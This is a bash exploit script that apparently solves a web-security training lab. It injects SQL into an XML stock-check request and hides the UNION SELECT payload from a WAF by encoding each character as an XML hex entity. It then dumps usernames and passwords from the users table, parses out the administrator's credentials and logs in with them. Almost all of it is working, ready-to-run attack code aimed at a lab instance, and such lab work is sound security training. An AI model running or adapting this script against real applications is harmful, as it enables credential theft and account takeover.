#!/bin/bash

LAB_URL="https://0aff002c04e440e1801044aa005d009a.web-security-academy.net"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  SQL Injection — XML Filter Bypass (WAF Bypass)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# ─── Step 1: Get session cookie ───────────────────────────────────────────────
echo "[*] Fetching session cookie..."
RAW=$(curl -sk -D - -o /dev/null "$LAB_URL/")
SESSION=$(echo "$RAW" | grep -i 'session=' | grep -oP 'session=\K[^;]+' | head -1)
echo "[+] Session: $SESSION"
echo ""

# ─── Step 2: Confirm stock check endpoint works ───────────────────────────────
echo "[*] Step 1 — Verifying stock check endpoint with normal request..."
NORMAL_XML='<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
NORMAL_RESP=$(curl -sk -b "session=$SESSION" \
    -X POST "$LAB_URL/product/stock" \
    -H "Content-Type: application/xml" \
    -d "$NORMAL_XML")
echo "[+] Normal response: $NORMAL_RESP"
echo ""

# ─── Step 3: Confirm WAF blocks plain UNION ───────────────────────────────────
echo "[*] Step 2 — Confirming WAF blocks plain UNION SELECT..."
BLOCKED_XML='<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 UNION SELECT NULL</storeId></stockCheck>'
BLOCKED_RESP=$(curl -sk -b "session=$SESSION" \
    -X POST "$LAB_URL/product/stock" \
    -H "Content-Type: application/xml" \
    -d "$BLOCKED_XML")
if echo "$BLOCKED_RESP" | grep -qi "attack\|blocked\|forbidden\|400\|invalid"; then
    echo "[+] WAF block confirmed: $BLOCKED_RESP"
else
    echo "[!] Unexpected response: $BLOCKED_RESP"
fi
echo ""

# ─── Step 4: Hex-encode the payload to bypass WAF ────────────────────────────
echo "[*] Step 3 — Generating hex-encoded XML payload..."

# Use Python to convert each char to &#xNN; XML entity
SQL_PAYLOAD="1 UNION SELECT username || '~' || password FROM users"
ENCODED=$(python3 -c "
payload = \"$SQL_PAYLOAD\"
print(''.join(f'&#x{ord(c):02x};' for c in payload))
")

echo "[+] Raw SQL  : $SQL_PAYLOAD"
echo "[+] Encoded  : $ENCODED"
echo ""

# ─── Step 5: Send WAF-bypassed payload ───────────────────────────────────────
echo "[*] Step 4 — Sending hex-encoded payload (WAF bypass)..."
EXPLOIT_XML="<?xml version=\"1.0\" encoding=\"UTF-8\"?><stockCheck><productId>1</productId><storeId>${ENCODED}</storeId></stockCheck>"

EXPLOIT_RESP=$(curl -sk -b "session=$SESSION" \
    -X POST "$LAB_URL/product/stock" \
    -H "Content-Type: application/xml" \
    -d "$EXPLOIT_XML")

echo "[+] Raw response:"
echo "$EXPLOIT_RESP"
echo ""

# ─── Step 6: Extract credentials ─────────────────────────────────────────────
echo "[*] Step 5 — Parsing credentials..."

# Credentials are in format: username~password (one per line)
ADMIN_LINE=$(echo "$EXPLOIT_RESP" | grep -i 'administrator')
if [ -z "$ADMIN_LINE" ]; then
    # Try grabbing any line with ~ separator
    ADMIN_LINE=$(echo "$EXPLOIT_RESP" | grep '~')
fi

ADMIN_USER=$(echo "$ADMIN_LINE" | cut -d'~' -f1 | tr -d ' \r\n')
ADMIN_PASS=$(echo "$ADMIN_LINE" | cut -d'~' -f2 | tr -d ' \r\n')

if [ -n "$ADMIN_USER" ] && [ -n "$ADMIN_PASS" ]; then
    echo "[+] Username : $ADMIN_USER"
    echo "[+] Password : $ADMIN_PASS"
else
    echo "[!] Could not auto-parse. Full dump:"
    echo "$EXPLOIT_RESP"
    exit 1
fi
echo ""

# ─── Step 7: Login ────────────────────────────────────────────────────────────
echo "[*] Step 6 — Logging in as $ADMIN_USER..."
LOGIN_RESP=$(curl -sk -D - -c /tmp/xml_sqli_session.txt \
    -X POST "$LAB_URL/login" \
    -d "username=${ADMIN_USER}&password=${ADMIN_PASS}")

if echo "$LOGIN_RESP" | grep -qi "302\|location.*my-account"; then
    FINAL=$(curl -sk -b /tmp/xml_sqli_session.txt "$LAB_URL/my-account")
    if echo "$FINAL" | grep -qi "Log out\|Your username\|administrator"; then
        echo "[✓] Logged in successfully! Lab solved."
    else
        echo "[!] Redirected but session unclear — try manually"
    fi
else
    echo "[!] Login response unclear — use these creds manually:"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "  Username : $ADMIN_USER"
echo "  Password : $ADMIN_PASS"
echo "  Login at : $LAB_URL/login"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
